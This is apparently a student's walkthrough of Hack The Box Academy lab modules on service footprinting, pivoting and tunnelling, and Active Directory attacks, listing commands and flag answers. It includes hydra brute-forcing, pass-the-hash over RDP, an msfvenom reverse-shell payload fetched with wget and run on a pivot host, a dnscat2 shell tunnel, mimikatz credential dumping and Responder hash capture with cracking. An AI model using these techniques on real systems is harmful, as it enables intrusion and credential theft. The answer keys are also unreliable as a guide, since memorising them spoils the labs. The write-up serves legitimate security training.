# List databases
SELECT name FROM master.dbo.sysdatabases

# Let's see tables in flagDB
SELECT table_name FROM flagDB.INFORMATION_SCHEMA.TABLES

# Ok, we need to select the DB before asking for its contents
USE flagDB

# Now print the content of the table:
SELECT * FROM tb_flag
```

Results: HTB{!_l0v3_#4$#!n9_4nd_r3$p0nd3r}

### RDP
RDP to  with user "htb-rdp" and password "HTBRocks!"

**What is the name of the file that was left on the Desktop? (Format example: filename.txt).**

```
xfreerdp /d:$domain] /u:$user /p:$pass /v:$ip
```

Results: pentest-notes.txt


**Which registry key needs to be changed to allow Pass-the-Hash with the RDP protocol?**

Reading the file pentest-notes.txt

```
We found a hash from another machine Administrator account, we tried the hash in this computer but it didn't work, it doesn't have SMB or WinRM open, RDP Pass the Hash is not working.

User: Administrator
Hash: 0E14B9D6330BF16C30B1924111104824
```

Which means that RDP connection with pass the hash needs some troubleshooting. 
*Restricted Admin Mode*, which is disabled by default, should be enabled on the target host; otherwise, you will be presented with an error. This can be enabled by adding a new registry key `DisableRestrictedAdmin` (REG_DWORD) under `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa` with the value of 0. It can be done using the following command:

```powershell
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```


Results: DisableRestrictedAdmin


**Connect via RDP with the Administrator account and submit the flag.txt as you answer.**

Once the registry key is added, we can use xfreerdp with the option /pth to gain RDP access.

```
xfreerdp /d:$domain /u:Administrator /pth:0E14B9D6330BF16C30B1924111104824 /v:$ip 
```

Results: `HTB{RDP_P4$$_Th3_H4$#}`

### DNS

Find all available DNS records for the "inlanefreight.htb" domain on the target name server and submit the flag found as a DNS record as the answer.

```
# Enumerate subdomains
dnsenum --dnsserver 10.129.86.251 --enum -p 0 -s 0 -o subdomains.txt -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt inlanefreight.htb
# you will get the following subdomains:
# ns.inlanefreight.htb, control.inlanefreight.htb, helpdesk.inlanefreight.htb


# Install subbrute
git clone https://github.com/TheRook/subbrute.git >> /dev/null 2>&1

# Access the tool
cd subbrute

# Configure resolver file 
echo "ns.inlanefreight.htb" > ./resolvers.txt

# Enumerate subdomains with subbrute
python3 subbrute.py inlanefreight.htb -s ./names.txt -r ./resolvers.txt
# You will get the following subdomains:
# hr.inlanefreight.htb

# Attempt a zone transfer
 dig AXFR @ns.inlanefreight.htb hr.inlanefreight.htb 
```


```
; <<>> DiG 9.19.21-1-Debian <<>> AXFR @ns.inlanefreight.htb hr.inlanefreight.htb
; (1 server found)
;; global options: +cmd
hr.inlanefreight.htb.	604800	IN	SOA	inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800
hr.inlanefreight.htb.	604800	IN	TXT	"HTB{LUIHNFAS2871SJK1259991}"
hr.inlanefreight.htb.	604800	IN	NS	ns.inlanefreight.htb.
ns.hr.inlanefreight.htb. 604800	IN	A	127.0.0.1
hr.inlanefreight.htb.	604800	IN	SOA	inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800
;; Query time: 40 msec
;; SERVER: 10.129.86.251#53(ns.inlanefreight.htb) (TCP)
;; WHEN: Fri Nov 01 14:34:47 EDT 2024
;; XFR size: 5 records (messages 1, bytes 230)
```

Results: `HTB{LUIHNFAS2871SJK1259991}`


### SMTP

**What is the available username for the domain inlanefreight.htb in the SMTP server?**

```
smtp-user-enum -M RCPT -U users.list  -D inlanefreight.htb -t $ip
```

Results: marlin

**Access the email account using the user credentials that you discovered and submit the flag in the email as your answer.**

```
hydra -l marlin@inlanefreight.htb -P passwords.list -f $ip pop3
# It will return the password: poohbear

# Now connect to POP server
telnet $ip 110
USER marlin@inlanefreight.htb
PASS poohbear
STATS
LIST
RETR 1
```

Results: `HTB{w34k_p4$$w0rd}`



### Skills Assessment

We were commissioned by the company Inlanefreight to conduct a penetration test against three different hosts to check the servers' configuration and security. We were informed that a flag had been placed somewhere on each server to prove successful access. These flags have the following format: - `HTB{...}`. Our task is to review the security of each of the three servers and present it to the customer. According to our information, the first server is a server that manages emails, customers, and their files.

**EASY. You are targeting the inlanefreight.htb domain. Assess the target server and obtain the contents of the flag.txt file. Submit it as the answer.**

```
sudo nmap -sC -sV -Pn $ip
echo "$ip    inlanefreight.htb" | sudo tee -a /etc/host

# Download the users.list from HTB or you will go bananas
smtp-user-enum -M RCPT -U users.list -D inlanefreight.htb -t $ip 
# As a result you get fiona@inlanefreight.htb exists

# Password attack
hydra -l fiona@inlanefreight.htb -P passwords.list -t 64 -f $ip smtp
# Result: [25][smtp] host: 10.129.179.42   login: fiona@inlanefreight.htb   password: 987654321

# Now we login into the service mysql
mysql -u fiona -p"987654321" -h $ip

SELECT LOAD_FILE("C:/Users/Administrator/Desktop/flag.txt");
```

Results: `HTB{t#3r3_4r3_tw0_w4y$_t0_93t_t#3_fl49}`


The second server is an internal server (within the `inlanefreight.htb` domain) that manages and stores emails and files and serves as a backup of some of the company's processes. From internal conversations, we heard that this is used relatively rarely and, in most cases, has only been used for testing purposes so far.

**MEDIUM: Assess the target server and find the flag.txt file. Submit the contents of this file as your answer.**

```
sudo nmap -sC -sV -Pn -p- $ip

ftp $ip 30021
# Enter as creds anonymous:anonymous
# dir
# cd simon
# mget *.txt
# quit

ssh simon@$ip
# Enter password 8Ns8j1b!23hs4921smHzwn

cat flag.txt
```

Results: HTB{1qay2wsx3EDC4rfv_M3D1UM}



**Hard. The third server is another internal server used to manage files and working material, such as forms. In addition, a database is used on the server, the purpose of which we do not know.** 

What file can you retrieve that belongs to the user "simon"? (Format: filename.txt)

```
smbclient -L \\$ip -U simon 

smbclient  \\\\$ip\\Home -U simon -N
cd IT
cd Simon
```

Results: random.txt

Enumerate the target and find a password for the user Fiona. What is her password?

```
smbclient -L \\$ip -U simon 

smbclient  \\\\$ip\\Home -U simon -N
cd IT
cd Fiona
get creds.txt
quit

cat creds.txt
#Try with all creds and see that "48Ns72!bns74@S84NNNSl" works for:
smbclient  \\\\$ip\\Home -U fiona 
```

Results: `48Ns72!bns74@S84NNNSl`


Once logged in, what other user can we compromise to gain admin privileges?

Results: John

Submit the contents of the flag.txt file on the Administrator Desktop.

```
rdesktop -u Fiona -p '48Ns72!bns74@S84NNNSl' $ip

# Open Powershell
sqlcmd

# List databases
1> SELECT name FROM master.dbo.sysdatabases
2> go
# Enumerate DB and nothing interesting comes out

# Verify if our current user has the sysadmin role:
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
go
#  value 0 indicates no sysadmin role, value 1 is sysadmin role. Fiona has no sysadminrole


# Identify Users that we Can Impersonate
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE' 
go

# As a result we can see john. Let's impersonate him and verify if hjohn has sysadmin role
EXECUTE AS LOGIN = 'john';  
SELECT SYSTEM_USER;  
SELECT IS_SRVROLEMEMBER('sysadmin');  
go

# No sysadmin role for john


# Identify linked Servers in MSSQL
SELECT srvname, isremote FROM sysservers
go

# As response we have
# WINSRV02\SQLEXPRESS                                         # LOCAL.TEST.LINKED.SRV                                                                                                     
# We can read files from that connection in local
execute ('select * from OPENROWSET(BULK ''C:/Users/Administrator/desktop/flag.txt'', SINGLE_CLOB) AS Contents') at [local.test.linked.srv]; 

```

Results: `HTB{46u$!n9_l!nk3d_$3rv3r$}` 


## [Pivoting, Tunneling, and Port Forwarding](https://academy.hackthebox.com/module/details/158)

### Introduction

**Reference the Using ifconfig output in the section reading. Which NIC is assigned a public IP address?**

Results: eth0


**Reference the Routing Table on Pwnbox output shown in the section reading. If a packet is destined for a host with the IP address of 10.129.10.25, out of which NIC will the packet be forwarded?**

Results: tun0


**Reference the Routing Table on Pwnbox output shown in the section reading. If a packet is destined for www.hackthebox.com what is the IP address of the gateway it will be sent to?**

Results: 178.62.64.1


### Choosing The Dig Site & Starting Our Tunnels

SSH to $ip with user "ubuntu" and password "HTB_@cademy_stdnt!"
You have successfully captured credentials to an external facing Web Server. Connect to the target and list the network interfaces. How many network interfaces does the target web server have? (Including the loopback interface)

```
ssh ubuntu@$ip -D 1234
ip a
```

Results: 3

Apply the concepts taught in this section to pivot to the internal network and use RDP (credentials: victor:pass@123) to take control of the Windows target on 172.16.5.19. Submit the contents of Flag.txt located on the Desktop.

```
# Configure proxychains.
sudo nano /etc/proxychains4.conf
# Adding the last line: socks5 127.0.0.1 1234

# Set the dynamic port:
ssh ubuntu@$ip -D 1234 
# Scan the NIC in the connection
ip a

# Open a different terminal and run a nmap on the network range to discover ips (another network) from the victim's
proxychains nmap -v -sT -Pn 172.16.5.1-255

# In the results you will see 172.16.5.19. Now run a nmap on that ip
proxychains nmap -v -sT -Pn 172.16.5.19
# Open ports: 
# 53/tcp   open  domain
# 80/tcp   open  http
# 88/tcp   open  kerberos-sec
# 135/tcp  open  msrpc
# 139/tcp  open  netbios-ssn
# 389/tcp  open  ldap
# 445/tcp  open  microsoft-ds
# 464/tcp  open  kpasswd5
# 593/tcp  open  http-rpc-epmap
# 636/tcp  open  ldapssl
# 3268/tcp open  globalcatLDAP
# 3269/tcp open  globalcatLDAPssl
# 3389/tcp open  ms-wbt-server

# In a different terminal
export user="victor"
export pass="pass@123" 
proxychains xfreerdp  /u:$user /p:$pass /v:172.16.5.19
# And you will get a RDP connection. Open the flag.txt
```

Results: N1c3Piv0t

**SSH to $ip with user "ubuntu" and password "HTB_@cademy_stdnt!"**
**Which IP address assigned to the Ubuntu server Pivot host allows communication with the Windows server target? (Format: x.x.x.x)**

```
# Configure proxychains.
sudo nano /etc/proxychains4.conf
# Adding the last line: socks5 127.0.0.1 1234

# Set the dynamic port:
ssh ubuntu@$ip -D 1234 
# Scan the NIC in the connection
ip a
```

Results: 172.16.5.129

**What IP address is used on the attack host to ensure the handler is listening on all IP addresses assigned to the host? (Format: x.x.x.x)**

Results: 0.0.0.0


**What two IP addresses can be discovered when attempting a ping sweep from the Ubuntu pivot host? (Format: x.x.x.x,x.x.x.x)**

```
# Configure proxychains.
sudo nano /etc/proxychains4.conf
# Adding the last line: socks5 127.0.0.1 1234

# Set the dynamic port:
ssh ubuntu@$ip -D 1234 
# Scan the NIC in the connection
ip a

# Open a different terminal and run a nmap on the network range to discover ips (another network) from the victim's
proxychains nmap -v -sT -Pn 172.16.5.1-255

# In the results you will see 172.16.5.19. Now run a nmap on that ip
# Open ports: 
# 53/tcp   open  domain
# 80/tcp   open  http
# 88/tcp   open  kerberos-sec
# 135/tcp  open  msrpc
# 139/tcp  open  netbios-ssn
# 389/tcp  open  ldap
# 445/tcp  open  microsoft-ds
# 464/tcp  open  kpasswd5
# 593/tcp  open  http-rpc-epmap
# 636/tcp  open  ldapssl
# 3268/tcp open  globalcatLDAP
# 3269/tcp open  globalcatLDAPssl
# 3389/tcp open  ms-wbt-server

```

Results: 172.16.5.19,172.16.5.129

**Which of the routes that AutoRoute adds allows 172.16.5.19 to be reachable from the attack host? (Format: x.x.x.x/x.x.x.x)**

Results: 172.16.5.0/255.255.254.0 via 10.129.202.64

### Playing Pong with Socat

**SSH tunneling is required with Socat. True or False?**

Results: False


**What Meterpreter payload did we use to catch the bind shell session? (Submit the full path as the answer)**

Results: windows/x64/meterpreter/bind_tcp


###  Pivoting Around Obstacles

**From which host will rpivot's server.py need to be run from? The Pivot Host or Attack Host? Submit Pivot Host or Attack Host as the answer.**

Results: Attack Host


**From which host will rpivot's client.py need to be run from? The Pivot Host or Attack Host. Submit Pivot Host or Attack Host as the answer.**

Results: Pivot Host


**SSH to $ip with user "ubuntu" and password "HTB_@cademy_stdnt!". Using the concepts taught in this section, connect to the web server on the internal network. Submit the flag presented on the home page as the answer.**

```
# Kali, terminal 1, copy the rpivot folder and run the server 
scp -r rpivot ubuntu@$UbuntuIP:/home/ubuntu/
cd rpivot/ 
python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0

# Kali, terminal 2, connect to the ubuntu machine and run the rpivot client
ssh ubuntu@$ip
cd rpivot/
python2.7 client.py --server-ip $KaliIP --server-port 9999

# Kali, terminal 3, edit proxychains4.conf file and add the line ' sock4 127.0.0.1 9050' at the last line
sudo nano /etc/proxychains4.conf  

# Kali, terminal 3, connect to the internal web server:
proxychains firefox-esr $ipWebServer
```

Results: I_L0v3_Pr0xy_Ch@ins


RDP to $ip  with user "htb-student" and password "HTB_@cademy_stdnt!". Using the concepts covered in this section, take control of the DC (172.16.5.19) using xfreerdp by pivoting through the Windows 10 target host. Submit the approved contact's name found inside the "VendorContacts.txt" file located in the "Approved Vendors" folder on Victor's desktop (victor's credentials: victor:pass@123) . (Format: 1 space, not case-sensitive)

```
# From kali, terminal 1, connect to the windows machine
xfreerdp  /u:"htb-student" /p:"HTB_@cademy_stdnt\!" /v:$ipWindows

# Run Powershell as Administrator and execute:
netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=$IpInterface1Windows connectport=3389 connectaddress=$IpInterface2Windows

# Make sure the connection is saved
netsh.exe interface portproxy show v4tov4

# From kali, terminal 2, connect to the Target:
xfreerdp  /u:victor /p:pass@123 /v:$IpInterface1Windows:8080

# Browse to the file and capture the flag
```

Results: Jim Flipflop

### Branching Out Our Tunn

RDP to 10.129.42.198 (ACADEMY-PIVOTING-WIN10PIV) with user "htb-student" and password "HTB_@cademy_stdnt!". Using the concepts taught in this section, connect to the target and establish a DNS Tunnel that provides a shell session. Submit the contents of C:\Users\htb-student\Documents\flag.txt as the answer.

```
# In the kali attacker machine with ip $ip:
##################################
# Install the DNScat server
git clone https://github.com/iagox86/dnscat2.git

cd dnscat2/server/
sudo gem install bundler
sudo bundle install

# Launch the server
sudo ruby dnscat2.rb --dns host=$ipAttackerMachine,port=53,domain=inlanefreight.local --no-cache

# See the response after launching the server. The dns server will generate a secret that we will use from the victim machine to connect

# Now, we need the client connection. As our targetted machine is Windows we download the powershell client dnscat2 to our kali
git clone https://github.com/lukebaggett/dnscat2-powershell.git

# Then, copy the dnscat2.ps1 file to the windows victim machine. For that use any of the file transfer techniques. In this case I initiated a http server from the folder where dnscat2.ps1 was
python -m http.server 8000


# Additionally, I opened a RDP connection with the windows machine:
xfreerdp  /u:"htb-student" /p:"HTB_@cademy_stdnt\!" /v:$ip


###########################################
## From the windows machine. Open a powershell
################
# Download the dnscat2 powershell client:
curl http://$ipAttackerMachine:8000/dnscat2.ps1 > dnscat2.ps1

# Install
Import-Module .\dnscat2.ps1

# Initiate the connection
Start-Dnscat2 -DNSserver $ipAttackerMachine -Domain domain.local -PreSharedSecret $secret -Exec cmd 
# $secret is obtained from the server launched in the kali machne.

###########################################
## From the kali Attacker machine
################
# We will receive the message:
# New window created: 1
# Session 1 Security: ENCRYPTED AND VERIFIED!
(the security depends on the strength of your pre-shared secret!)

# Enter the session
window -i 1

# Retrieve the flag
type C:\Users\htb-student\Documents\flag.txt
```

Results: AC@tinth3Tunnel

SSH to $ip with user "ubuntu" and password "HTB_@cademy_stdnt!" Using the concepts taught in this section, connect to the target and establish a SOCKS5 Tunnel that can be used to RDP into the domain controller (172.16.5.19, victor:pass@123). Submit the contents of C:\Users\victor\Documents\flag.txt as the answer.

```
#########
# In the attacker machine
#######
git clone https://github.com/jpillora/chisel.git

cd chisel
go build


# It can be helpful to be mindful of the size of the files we transfer onto targets on our client's networks, not just for performance reasons but also considering detection.
# You can run `go build -ldflags="-s -w"` and reduce it to 7.5MB (where `-s` is “Omit all symbol information from the output file” or strip, and `-w` is “Omit the DWARF symbol table”).
go build -ldflags="-s -w"

# Copy the file to the target
scp chisel ubuntu@$ip:~/

# And connect to the machine
ssh ubuntu@$ip


#########
# In the Ubuntu compromised machine, our Pivot Host
#######

./chisel server -v -p 1234 --socks5

sudo ./chisel server --reverse -v -p 1234 --socks5
```


 SSH to $ip with user "ubuntu" and password "HTB_@cademy_stdnt!"
**Using the concepts taught in this section, connect to the target and establish a SOCKS5 Tunnel that can be used to RDP into the domain controller (172.16.5.19, victor:pass@123). Submit the contents of C:\Users\victor\Documents\flag.txt as the answer.**

Results: `Th3$eTunne1$@rent8oring!`


 **Using the concepts taught thus far, connect to the target and establish an ICMP tunnel. Pivot to the DC (172.16.5.19, victor:pass@123) and submit the contents of C:\Users\victor\Downloads\flag.txt as the answer.**

```shell-session
#########
# In the attacker machine
#######
git clone https://github.com/utoni/ptunnel-ng.git

# Once the ptunnel-ng repo is cloned to our attack host, we can run the autogen.sh script located at the root of the ptunnel-ng directory. Building Ptunnel-ng with Autogen.sh
sudo ./autogen.sh 

# Another way to build the ptunnel-ng binary
sudo apt install automake autoconf -y
cd ptunnel-ng/
sed -i '$s/.*/LDFLAGS=-static "${NEW_WD}\/configure" --enable-static $@ \&\& make clean \&\& make -j${BUILDJOBS:-4} all/' autogen.sh
./autogen.sh

# After running autogen.sh, ptunnel-ng can be used from the client and server-side. We will now need to transfer the repo from our attack host to the target host
scp -r ptunnel-ng ubuntu@$ipUbuntuCompromisedMachine:~/

# Connect to the ubuntu
ssh ubuntu@$ipUbuntuCompromisedMachine
```


**2.** Start the ptunnel-ng Server on the Target Host

```shell-session
#########
# In the Ubuntu compromised machine, our Pivot Host
#######
sudo ./ptunnel-ng/src/ptunnel-ng -r$ipUbuntuCompromisedMachine -R22
```

**3.** With the ptunnel-ng ICMP tunnel successfully established, we can attempt to connect to the target using SSH through local port 2222 (-p2222).

```shell-session
#########
# In the attacker machine
#######

# Connecting to ptunnel-ng Server from Attack Host
sudo ./src/ptunnel-ng -p$ipUbuntuCompromisedMachine -l2222 -r$ipUbuntuCompromisedMachine -R22
```

Now we can use proxychains with RDP to connect to the machine in the other network range:

```shell-session
# First, enable Dynamic Port Forwarding over SSH
ssh -D 9050 -p2222 -lubuntu 127.0.0.1

# Now we can use proxychains with nmap
proxychains xfreerdp  /u:$user /p:$password /v:172.16.5.19
```

Results: N3Tw0rkTunnelV1sion!


### Double Pivots
RDP to $ip with user "htb-student" and password "HTB_@cademy_stdnt!"
**Use the concepts taught in this section to pivot to the Windows server at 172.16.6.155 (jason:WellConnected123!). Submit the contents of Flag.txt on Jason's Desktop.**

Our goal will be reaching the attacked machine 3. 

**1.** First, we download appropriate binaries to our kali attack host:

- [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases)
- [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)


**2.**  Attacking machine 1

Connect to the target using xfreerdp and transfer SocksOverRDPx64.zip to the Windows target machine. Once done, unzip it.

From the Windows machine 1, we will then need to load the SocksOverRDP.dll (located within the SocksOverRDP-x64 folder) using regsvr32.exe. **Do it as Admin**

```cmd-session
regsvr32.exe SocksOverRDP-Plugin.dll
```

**3.** Attacking machine 2

Now, from the machine 1, we can connect to machine 2  over RDP using `mstsc.exe`. Windows-R and enter mstsc.exe. Enter the machine 2 IP 172.16.5.19, username and password. When doing so,  we should receive a prompt that the SocksOverRDP plugin is enabled. And we will have access to the machine 2 from the RDP connection done from machine 1.

**4.** Attacking machine 3

Now we need to transfer SocksOverRDPx64.zip or just the SocksOverRDP-Server.exe to machine 2, 172.16.5.19.  You can just try to copy paste it.


When done, **start SocksOverRDP-Server.exe with Admin privileges** in machine 2.

When we go back to our foothold target (machine 1) and check with Netstat, we should see our SOCKS listener started on 127.0.0.1:1080.

```cmd-session
netstat -antb | findstr 1080
```

Also, we transfer from our kali machine to the machine 1, the proxifier portable. Once done we configure it in machine 1 to forward all our packets to 127.0.0.1:1080. Use SOCKS5 as protocol. 

```
Open proxifier and go to Profile > Proxy server. Click on "Add..."
```

With Proxifier configured and running, we can **start mstsc.exe**, and it will use Proxifier to pivot all our traffic via 127.0.0.1:1080, which will tunnel it over RDP to 172.16.5.19, which will then route it to 172.16.6.155 using SocksOverRDP-server.exe.

So, now Windows-R and mstsc.exe to connect to machine 3 with username and password. If there are some problems with the connection, play in RDP program with the tab EXPERIENCE.

Results: H0pping@roundwithRDP!

### Skill assessments
A team member started a Penetration Test against the Inlanefreight environment but was moved to another project at the last minute. Luckily for us, they left a `web shell` in place for us to get back into the network so we can pick up where they left off. We need to leverage the web shell to continue enumerating the hosts, identifying common services, and using those services/protocols to pivot into the internal networks of Inlanefreight. Our detailed objectives are `below`:

**Objectives**

- Start from external (`Pwnbox or your own VM`) and access the first system via the web shell left in place.
- Use the web shell access to enumerate and pivot to an internal host.
- Continue enumeration and pivoting until you reach the `Inlanefreight Domain Controller` and capture the associated `flag`.
- Use any `data`, `credentials`, `scripts`, or other information within the environment to enable your pivoting attempts.
- Grab `any/all` flags that can be found.


**Once on the webserver, enumerate the host for credentials that can be used to start a pivot or tunnel to another host in the network. In what user's directory can you find the credentials? Submit the name of the user as the answer.**

```
# Enumerate $ip
sudo nmap $ip
# It will return port 80 and 22. Open a browser and go to http://$ip. It's a reverse shell. 
cd /home
ls -la
# You will get two users. Have a look at webadmin. 
ls -la /home/webadmin
# You will get a id_rsa file. Copy it to your kali machine and use it to connect again via ssh as webadmin
ssh -i id_rsa webadmin@$ip
```

Results: webadmin


**Submit the credentials found in the user's home directory. (Format: user:password)**

```
cat for-admin-eyes-only
```

Results: mlefay:Plain Human work!


**Enumerate the internal network and discover another active host. Submit the IP address of that host as the answer.**

```
ip a

# Now we do a ping sweep
for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
```

Results: 172.16.5.35


**Use the information you gathered to pivot to the discovered host. Submit the contents of C:\Flag.txt as the answer.**

```
###########
# I will use Module `Autoroute` in metasploit:
############

# Autoroute module allows you to set routes from a meterpreter session to a discovered subnet in the attacked machine. It allow us pivoting from one subnet to another.
# 1. Create a payload for the Ubuntu Pivot Host (our victim's machine 1):

msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$ipKali -f elf -o backupjob LPORT=8080

# 2. Kali machine. Different terminal. Start a multi/handler, also known as a Generic Payload Handler.
msfconsole -q
use exploit/multi/handler
set lhost 0.0.0.0
set lport 8080
set payload linux/x64/meterpreter/reverse_tcp
run

# 3. Once created, kali machine, serve it with a python http server
python3 -m http.server 8001

# 4. Connect to the Ubuntu with the id_rsa and download the file
ssh -i id_rsa webadmin@ipUbuntu
wget http://$ipKali:8001/backupjob
chmod +x backupjob

# 5. Ubuntu machine, execute the file to gain a Meterpreter session in your kali
./backupjob

# 6. Once the meterpreter Session is established, send the session to the background with CTRL-z and in the same terminal use Metasploit's post-exploitation routing module `socks_proxy` to configure a local proxy on our attack host.
use auxiliary/server/socks_proxy
set SRVPORT 9050
set SRVHOST 
set version 4a
run
# This SOCKS configuration will start a listener on port 9050 and route all the traffic received via our Meterpreter session.
# Even though the command line has not returned anything you can ask for the jobs in execution with:
jobs

# Make sure that your /etc/proxychains4.conf in your kali has enabled the line
socks4 127.0.0.1 9050
# Note: Depending on the version the SOCKS server is running, we may occasionally need to changes socks4 to socks5 in proxychains.conf.

# 7. Finally, we need to tell our socks_proxy module to route all the traffic via our Meterpreter session. Use the post/multi/manage/autoroute module from Metasploit to add routes for the 172.16.5.0 subnet and then route all our proxychains traffic.
use post/multi/manage/autoroute
set SESSION 1
set SUBNET $NewSubnet
# Example: set SUBNET 172.16.5.0
run
# This will bind session 1 to the $NewSubnet discovered in the victim's machine 1, doing the pivoting

# It is also possible to add routes with autoroute by running autoroute from the initial Meterpreter session (session 1):
sessions -i 1
run autoroute -s $NewDiscoveredIp/16

# List the active routes:
run autoroute -p

# 8. Make sure that you will get back the communications with a reverse proxy:

ssh -i id_rsa $username@$ipUbuntuCompromisedmachine -R $ipUbuntuCompromisedmachine:8080:0.0.0.0:8000

# 9. Finally, use proxychains to route our RDP session traffic via our Meterpreter session.
proxychains xfreerdp /v:172.16.5.35 /u:mlefay /p:"Plain Human work\!"

```

Results: S1ngl3-Piv07-3@sy-Day


**In previous pentests against Inlanefreight, we have seen that they have a bad habit of utilizing accounts with services in a way that exposes the users credentials and the network as a whole. What user is vulnerable?**

```
# 1. Copy mimikatz to the Windows machine 1 with CTLR-C CTRL-V. Then in the Powershell terminal
.\mimikatz.exe privilege::debug  sekurlsa::logonpasswords     

# You will see user vfrank and password
vfrank:Imply wet Unmasked!
```

Results: vfrank


**For your next hop enumerate the networks and then utilize a common remote access solution to pivot. Submit the C:\Flag.txt located on the workstation.**

```
# 1. Open CMD and enumerate network interfaces
ipconfig /all

# 2. Notice a new network range: 172.16.6.35. Enumerate new Ips in that new network range
for /L %i in (1 1 254) do ping 172.16.6.%i -n 1 -w 100 | find "Reply"
# As a result now we have 172.16.6.25

# Note: I had problems with the Poweshell enumerator. For some reason this did not work for me:
1..254 | % {"172.16.6.$($_): $(Test-Connection -count 1 -comp 172.15.6.$($_) -quiet)"}

# 3. Windows-R and mstsc.exe. Enter 172.16.6.25 and use the creds vfrank:Imply wet Unmasked!

```

Results: N3tw0rk-H0pp1ng-f0R-FuN

**Submit the contents of C:\Flag.txt located on the Domain Controller.**

```
# 1. In the previously open session, open a windows explorer and notice the shared unit Z:\

```

Results: 3nd-0xf-Th3-R@inbow!


## [Active Directory Enumeration & Attacks](https://academy.hackthebox.com/module/details/143)

### Initial Enumeration

**While looking at inlanefreights public records; A flag can be seen. Find the flag and submit it. ( format == HTB{****} )**

```
# Method 1
# Go to https://viewdns.info/
# Do a DNS Look up record for inlanefreight.com

# Method 2
dig TXT inlanefreight.com 
```

Results: HTB{5Fz6UPNUFFzqjdg0AzXyxCjMZ}


**SSH to  with user "htb-student" and password "HTB_@cademy_stdnt!"**
**From your scans, what is the "commonName" of host 172.16.5.5 ?**

```
ssh htb-student@$ip
for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done

# On discovered host 172.16.5.5, run a nmap aggressive
nmap -A 172.16.5.5
```

Results: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL


**What host is running "Microsoft SQL Server 2019 15.00.2000.00"? (IP address, not Resolved name)**

```
# FRom previous sweep ping we also had this ip 172.16.5.130. We run a nmap to verify
nmap -A 172.16.5.130
```

Results: 172.16.5.130


### Sniffing out a Foothold

**Run Responder and obtain a hash for a user account that starts with the letter b. Submit the account name as your answer.**

```
# One thing you can do is running kerbrute. For that previously in your kali machine
sudo responder -I ens224 -A -wf
```

Results: backupagent


**Crack the hash for the previous account and submit the cleartext password as your answer.**

```
echo "backupagent::INLANEFREIGHT:a44a64f117fef681:A2DD31752724815828DDEEA3CE0D14AF:0101000000000000007B3554C738DB0115079F6A10E61FB00000000002000800360047003900360001001E00570049004E002D0043005300500057005600580058004B0037003000360004003400570049004E002D0043005300500057005600580058004B003700300036002E0036004700390036002E004C004F00430041004C000300140036004700390036002E004C004F00430041004C000500140036004700390036002E004C004F00430041004C0007000800007B3554C738DB0106000400020000000800300030000000000000000000000000300000EDC155D127A35F887E8796110B67D2FFC726BEB6F6A090039BB1FB587FB8CC4E0A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0035002E003200320035000000000000000000" > hash2
hashcat -m 5600 hash2 /usr/share/wordlists/rockyou.txt
```

Results: h1backup55

**Run Responder and obtain an NTLMv2 hash for the user wley. Crack the hash using Hashcat and submit the user's password as your answer.**

```
sudo responder -I ens224 -A -wf
echo "wley::INLANEFREIGHT:59927891910ba43b:D0177CE077EDE96746E10975D2F34CAE:0101000000000000007B3554C738DB018AC0B8E5A51B55310000000002000800360047003900360001001E00570049004E002D0043005300500057005600580058004B0037003000360004003400570049004E002D0043005300500057005600580058004B003700300036002E0036004700390036002E004C004F00430041004C000300140036004700390036002E004C004F00430041004C000500140036004700390036002E004C004F00430041004C0007000800007B3554C738DB0106000400020000000800300030000000000000000000000000300000EDC155D127A35F887E8796110B67D2FFC726BEB6F6A090039BB1FB587FB8CC4E0A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0035002E003200320035000000000000000000" > hash3
hashcat -m 5600 hash3 /usr/share/wordlists/rockyou.txt
```

Results: transporter@4


**RDP to $ip (ACADEMY-EA-MS01) with user "htb-student" and password "Academy_student_AD!" Run Inveigh and capture the NTLMv2 hash for the svc_qualys account. Crack and submit the cleartext password as the answer.**

```
xfreerdp /v:$IP /u:htb-student /p:"Academy_student_AD\!" /cert:ignore

# Open Powershell as Administrator
cd c:/tools
.\Inveigh.exe   
echo "svc_qualys::INLANEFREIGHT:c64015117cfae8cf:6E069821C26309BFF0ADA96F643AA703:0101000000000000007B3554C738DB0164C7AEAE827BFB2C0000000002000800360047003900360001001E00570049004E002D0043005300500057005600580058004B0037003000360004003400570049004E002D0043005300500057005600580058004B003700300036002E0036004700390036002E004C004F00430041004C000300140036004700390036002E004C004F00430041004C000500140036004700390036002E004C004F00430041004C0007000800007B3554C738DB0106000400020000000800300030000000000000000000000000300000EDC155D127A35F887E8796110B67D2FFC726BEB6F6A090039BB1FB587FB8CC4E0A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0035002E003200320035000000000000000000" > hashsvc
hashcat -m 5600 hashsvc /usr/share/wordlists/rockyou.txt
```

Results: security#1


### Sighting In, Hunting For A User

**SSH to  $ip with user "htb-student" and password "HTB_@cademy_stdnt!"**
**What is the default Minimum password length when a new domain is created? (One number)**

```
# This information is included in the sylabus. It does not require us to run any command.
```

Results: 7


**What is the minPwdLength set to in the INLANEFREIGHT.LOCAL domain? (One number)**

```
# Connect to the pivot machine
ssh htb-student@$ip

ip a

# Sweep ping to discover IPs in the new the network range 172.16.5.X
for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done

# rpcclient via the SMB NULL session technique:
rpcclient -U "" -N 172.16.5.5

# Now, within rpcclient terminal, enumerate domain password information
getdompwinfo
```

Results: 8


